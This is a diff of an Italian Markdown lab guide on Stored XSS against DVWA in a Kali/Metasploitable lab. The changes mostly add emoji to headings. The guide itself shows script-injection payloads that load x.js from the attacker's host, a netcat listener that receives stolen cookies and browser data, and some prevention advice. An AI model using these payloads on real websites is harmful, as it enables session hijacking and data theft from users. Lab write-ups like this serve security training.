@@ -167,7 +167,7 @@ Questa guida documenta l'esecuzione di attacchi **Stored XSS** sulla piattaforma
 
 ---
 
-## Prerequisiti
+## 🔧 Prerequisiti
 1. **Ambiente configurato**:
    - **Kali Linux**: 192.168.50.165
    - **Metasploitable con DVWA**: 192.168.50.3
@@ -177,17 +177,17 @@ Questa guida documenta l'esecuzione di attacchi **Stored XSS** sulla piattaforma
 
 ---
 
-## Struttura della guida
-- **Attacco al livello Low**: utilizzo di un payload diretto.
-- **Attacco al livello Medium**: utilizzo di un payload compatto con file remoto.
-- **Dump di dati**: raccolta di cookie, user agent e altre informazioni.
-- **Screenshot**: dimostrazione dei passaggi chiave.
+## 📚 Struttura della guida
+- **⚙️ Attacco al livello Low**: utilizzo di un payload diretto.
+- **⚙️ Attacco al livello Medium**: utilizzo di un payload compatto con file remoto.
+- **📊 Dump di dati**: raccolta di cookie, user agent e altre informazioni.
+- **📸 Screenshot**: dimostrazione dei passaggi chiave.
 
 ---
 
-## Attacco XSS Stored - Livello Low
+## ⚙️ Attacco XSS Stored - Livello Low
 
-### **Step 1: Preparazione**
+### **1️⃣ Step 1: Preparazione**
 1. Configura un web server su Kali Linux per ospitare il file `x.js`:
    ```bash
    python3 -m http.server 80
@@ -215,72 +215,72 @@ Questa guida documenta l'esecuzione di attacchi **Stored XSS** sulla piattaforma
    });
    ```
 
-### **Step 2: Inserimento Payload**
+### **2️⃣ Step 2: Inserimento Payload**
 Inserisci il seguente payload nel campo **Message** di DVWA:
 ```html
 <script src="http://192.168.50.165/x.js"></script>
 ```
 
-### **Step 3: Avvia il Listener**
+### **3️⃣ Step 3: Avvia il Listener**
 Configura un listener su Kali per ricevere i dati:
 ```bash
 sudo nc -lvnp 4444
 ```
 
-### **Step 4: Risultati**
+### **4️⃣ Step 4: Risultati**
 Quando il commento viene visualizzato, i dati raccolti dal file `x.js` vengono inviati al listener.
 
 ![XSS Stored Low](./Screenshots/XSSStoredLow.png)
 
 ---
 
-## Attacco XSS Stored - Livello Medium
+## ⚙️ Attacco XSS Stored - Livello Medium
 
-### **Step 1: Preparazione**
+### **1️⃣ Step 1: Preparazione**
 1. Configura il server web e utilizza lo stesso file `x.js` preparato per il livello Low.
 2. Avvia il server web:
    ```bash
    python3 -m http.server 80
    ```
 
-### **Step 2: Inserimento Payload**
+### **2️⃣ Step 2: Inserimento Payload**
 Poiché il livello Medium ha restrizioni di lunghezza, utilizza un payload compatto:
 ```html
 <img src=x onerror="location='/x.js'">
 ```
 
-### **Step 3: Avvia il Listener**
+### **3️⃣ Step 3: Avvia il Listener**
 Configura un listener su Kali per ricevere i dati:
 ```bash
 sudo nc -lvnp 4444
 ```
 
-### **Step 4: Risultati**
+### **4️⃣ Step 4: Risultati**
 Quando il commento viene visualizzato, il file `x.js` viene caricato e i dati raccolti vengono inviati al listener.
 
 ![XSS Stored Medium](./Screenshots/XSSStoredMedium.png)
 
 ---
 
-## Dati Raccolti
+## 📊 Dati Raccolti
 Il file `x.js` raccoglie le seguenti informazioni:
-- **Cookies**: sessioni dell'utente.
-- **User Agent**: browser e sistema operativo.
-- **Lingua del Browser**.
-- **Piattaforma**: sistema operativo.
-- **Risoluzione dello schermo**.
-- **Dimensioni della finestra**.
-- **Referrer**: URL della pagina precedente.
-- **URL corrente**.
-- **Timestamp**: data e ora dell'attacco.
+- 🍪 **Cookies**: sessioni dell'utente.
+- 🖥️ **User Agent**: browser e sistema operativo.
+- 🌐 **Lingua del Browser**.
+- 🖱️ **Piattaforma**: sistema operativo.
+- 🖼️ **Risoluzione dello schermo**.
+- 🪟 **Dimensioni della finestra**.
+- 🔗 **Referrer**: URL della pagina precedente.
+- 📍 **URL corrente**.
+- ⏱️ **Timestamp**: data e ora dell'attacco.
 
 ---
 
-## Misure di Prevenzione
-1. **HttpOnly Cookies**: Protegge i cookie dall'accesso tramite JavaScript.
-2. **Validazione Input**: Sanitize sia lato client che lato server.
-3. **Content Security Policy (CSP)**: Limita l'esecuzione di script non autorizzati.
-4. **Escape HTML Output**: Evita l'inserimento di script.
+## 🛡 Misure di Prevenzione
+1. **🍪 HttpOnly Cookies**: Protegge i cookie dall'accesso tramite JavaScript.
+2. **🛡 Validazione Input**: Sanitize sia lato client che lato server.
+3. **📜 Content Security Policy (CSP)**: Limita l'esecuzione di script non autorizzati.
+4. **✏️ Escape HTML Output**: Evita l'inserimento di script.
 
 ---
 
